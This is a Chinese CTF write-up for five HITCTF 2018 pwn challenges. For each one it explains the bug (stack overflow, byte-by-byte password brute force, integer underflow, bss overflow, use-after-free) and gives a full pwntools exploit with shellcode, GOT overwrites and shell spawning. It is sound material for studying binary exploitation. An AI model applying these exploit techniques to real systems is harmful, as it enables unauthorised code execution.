# HITCTF2018 PWN WRITE UP
目录

[1.stackoverflow](#stackoverflow50)

[2.login](#login200)

[3.dragonball](#dragonball200)

[4.nodes](#nodes350)

[5.babynote](#babynote400)

## <span id="1">stackoverflow(50)</span>
一个很简单的栈溢出，可以覆盖返回地址设置好参数直接调用预先留好的flag函数，也可以自己设置参数去调用system(“cat flag”)，还可以用read函数把/bin/sh写在某个可写的位置上，然后system(“/bin/sh”)来拿shell。
![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn100_stackoverflow/images/1.png?raw=true)
![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn100_stackoverflow/images/2.png?raw=true)
```python
from pwn import *

#io = process("./stackoverflow")
io = remote("127.0.0.1",40000)

io.recvuntil("name:\n")
#gdb.attach(io)
io.sendline("a" * 0x2c + p32(0x080485df) + p32(0x0804862D) + p32(0xdeadbeef) + p32(0xc0ffee))
print io.recvline()
print io.recvline()
```

## <span id="2">login(200)</span>
一个登录系统，以root用户成功登录的话程序会直接cat flag，给出的程序里有root的密码，不过显然这个密码和服务器上运行程序的root密码是不一样的，从密码表示的意思也可以看出来。那么该怎么做呢，猜密码吗，显然不是的，这是一道pwn题，尝试寻找程序里的漏洞来获取flag。
	通过分析程序可以发现，当以root用户尝试登陆时，程序对输入进行了两次的检查，一次是在login函数，一次是在check函数，观察这两个函数，发现它们的检查方式有点区别：

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn200_login_local/images/1.png?raw=true)
![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn200_login_local/images/2.png?raw=true)

strncmp是指定长度的字符串比较函数，login的比较长度由read_input_raw返回，而check的比较长度则是固定的，再分析read_input_raw函数：

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn200_login_local/images/3.png?raw=true)

read_input_raw函数返回输入字符的个数，当输入的字符为”\n”时，输入结束，且“\n”不计入字符数，分析到这里，可以发现在login函数里密码校验的长度的可以由我们的输入来指定，虽然不能通过check，但可以通过一字节一字节爆破的方式来得到服务器的密码，脚本如下：
```python
from pwn import*

passwd = ""
flag = ""
for i in range(0,32):
	for j in range(0x20,0x80):
		#io = process("./login")
		io = remote("127.0.0.1",40001)
		io.recvuntil("Username: ")
		io.sendline("root")
		io.recvuntil("Password: ")
		io.sendline(passwd + chr(j))
		x = io.recvline()
		if "How can you login successful as root!" in x:
			passwd += chr(j)
			if i == 31:
				io.recvuntil("This is your flag: ")
				flag = io.recvline()
			io.close()
			break;
		
		else:
			io.close()

print "flag: " + flag
print "passwd: " + passwd
```
## <span id="3">dragonball(200)</span>
程序初始提供了15元，购买一个DragonBall花费5元，出售一个获得3元，集齐7个DragonBall可以执行许愿函数wish，wish函数存在栈溢出，可以泄露栈地址和覆盖函数的返回地址

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn250_DragonBall/images/1.png?raw=true)

用checksec检查程序，发现nx和canary都关闭了，那么就可以用shellcode来拿shell。那么问题是怎么集齐7龙珠。
	分析买卖流程，发现购买函数只检查了钱是否为0的情况，而且用于存储钱的变量是一个无符号整数，那么可以通过买卖操作让钱向下溢出而变大，就有足够的钱来买龙珠了。
```python
from pwn import *

shellcode  =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

def buy():
	p.recvuntil("You choice: ")
	p.sendline('1')
	p.recvuntil("Success!\n")
def sell():
	p.recvuntil("You choice: ")
	p.sendline('2')
	p.recvuntil("Success!\n")

#p = process('./DragonBall')
p = remote('111.230.132.82',40002)

p.recvuntil("You have 15 yuan in total, use them to collect 7 Dragon balls!\n\n")
buy()
sell()
for i in range(7):
	buy()

p.recvuntil("You choice: ")
p.sendline('4')
p.recvuntil("Tell me your wish: ")
p.send('a' * 0x68)
p.recvuntil('a' * 0x68)
ebp = int(p.recv(4)[::-1].encode('hex'),16)
print hex(ebp)
#gdb.attach(p)
p.send(shellcode + (0x3c - len(shellcode)) * 'a' + p32(ebp - 0x58))
p.interactive()
p.close()
```
## <span id="4">nodes(350)</span>
程序实现了一个单链表，可以插入、编辑节点，查看所有节点的内容，节点的结构体如下所示：

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn350_nodes/images/1.png?raw=true)

在生成和编辑节点时，data的输入长度由变量unk_804A080决定，unk_804A080初始为0x30。每完成一次插入，用于统计节点数量的全局变量dword_804A04C会+1，然后程序打印当前节点的数量，打印之前先用sprintf把字符串拷贝到char byte_804A060[32]上。

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn350_nodes/images/2.png?raw=true)

观察char byte_804A060[32]和unk_804A080的位置，发现当节点数量大于等于100时，sprintf拷贝到char byte_804A060[32]会覆盖unk_804A080的值，造成一个bss节上的溢出，unk_804A080的值变大了，再次编辑节点时，就可以通过输入data来覆盖结构体上的next指针，利用edit和list函数来实现任意地址的读写，可以修改puts@got为system，然后在节点的data上输入/bin/sh来获取shell，exp如下：
```python
from pwn import *

read_got = 0x0804A010
puts_got = 0x0804A024

puts  = 0x0005FCA0 
system = 0x0003ADA0 

p = remote("127.0.0.1",40003)

def add(value,data,flag=0):
	p.recvuntil("please input your choice:")
	p.sendline("1")
	p.recvuntil("Value:")
	p.sendline(str(value))
	p.recvuntil("Data:")
	if not flag:
		p.send(data)

def edit(OldValue,NewValue,NewData):
	p.recvuntil("please input your choice:")
	p.sendline("2")
	p.recvuntil("Node's value:")
	p.sendline(str(OldValue))
	p.recvuntil("New value:")
	p.sendline(str(NewValue))
	p.recvuntil("New data:")
	p.send(NewData)

def quit():
	p.recvuntil("please input your choice:")
	p.sendline("4")


for i in range(0,100):
	print i
	if i > 9:
		add(i,str(i),1)
	else:
		add(i,str(i))

edit(0,0,"/bin/sh\x00" + 'a'*0x28 + p32(puts_got))
p.recvuntil("please input your choice:")

p.sendline("3")
p.recvuntil("/bin/sh")
p.recvuntil("Value:")
puts_addr = int(p.recvline())
print hex(puts_addr)

libc_base = puts_addr - puts
system_addr = libc_base + system

edit(puts_addr,system_addr,"0")
p.sendline("3")
p.interactive()
```
## <span id="5">babynote(400)</span>
很常见的菜单程序，提供了添加、编辑、打印和删除note的功能，note的结构体如下所：

![](https://github.com/7Hxz233/2018-HITCTF-Challenges/blob/master/pwn/pwn400_babynote/imgaes/1.png?raw=true)

content的大小可以自己定义
	程序删除note的时候，并没有将对应存储指针的全局变量设为空，仍然可以被使用，存在uaf漏洞，考虑到note结构体的大小，可以用fastbin的uaf来做。
	首先分配两个note，note0和note1，两个note的content被malloc分配的大小设为与note结构体的大小不等，然后删除note0和note1，再添加note2，content大小申请为0xc，根据堆的分配规则，此时note2和note1指向同一个fastbin，note2的content和note0指向同一个fastbin。由于程序开启了pie，首先要想办法确定elf的地址，然后才能泄漏libc，这里可以通过填充note2的content与note0上的函数指针void (*print)(struct note *)相连，来打印函数指针的地址，确定elf的地址。然后继续修改note2的content，改变note0的content指针，可以实现任意地址读写，最后可以修改note0的函数指针为system，并在结构体头部放置/bin/sh，调用打印函数来获取shell，exp如下：
```python
from pwn import*

printf_got = 0x3010
libc_system = 0x0003ADA0
libc_printf  = 0x00049670 

def add(size,content):
	io.recvuntil("Your choice :")
	io.sendline('1')
	io.recvuntil("Content size:")
	io.sendline(size)
	io.recvuntil("Input the content:")
	io.send(content)
	io.recvuntil("Success !\n")
	
def edit(index,content):
	io.recvuntil("Your choice :")
	io.sendline('2')
	io.recvuntil("Input the index:")
	io.sendline(index)
	io.recvuntil("New content:")
	io.sendline(content)
	io.recvuntil("Success !\n")

def delete(index):
	io.recvuntil("Your choice :")
	io.sendline('4')
	io.recvuntil("Input the index:")
	io.sendline(index)
	io.recvuntil("Success !\n")

def printnote(index,flag = 0):
	io.recvuntil("Your choice :")
	io.sendline('3')	
	io.recvuntil("Input the index:")
	io.sendline(index)
	if flag == 0:
		io.recvuntil("aaaaaaa\n")
		addr = io.recv(4)
		io.recvuntil("\n")
		return int(addr[0:4][::-1].encode("hex"),16)
	else:
		addr = io.recvuntil("\n")
		return int(addr[0:4][::-1].encode("hex"),16)

def exit():
	io.recvuntil("Your choice :")
	io.sendline('5')

#io = process("./babynote")
io = remote("127.0.0.1",40004)

add('100',"111\n")
add('100',"222\n")
delete('0')
delete('1')
add('12',"aaaaaaa\n")
v_func = printnote('2')
elf_base = v_func - 0x98a
printf_got = elf_base + printf_got

print "v_func: " + hex(v_func)
print "elf_base: " + hex(elf_base)
print "printf_got: " + hex(printf_got)

edit('2',p32(0xc) + p32(printf_got) + p32(v_func))
printf_addr = printnote('0',1)
libc_base = printf_addr - libc_printf
system_addr = libc_base + libc_system

print "libc_base: " + hex(libc_base)
print "printf: " + hex(printf_addr)
print "system: " + hex(system_addr)

edit('2',"/bin/sh\x00" + p32(system_addr))
io.recvuntil("Your choice :")
io.sendline('3')	
io.recvuntil("Input the index:")
io.sendline("0")
io.interactive()
io.close()
```
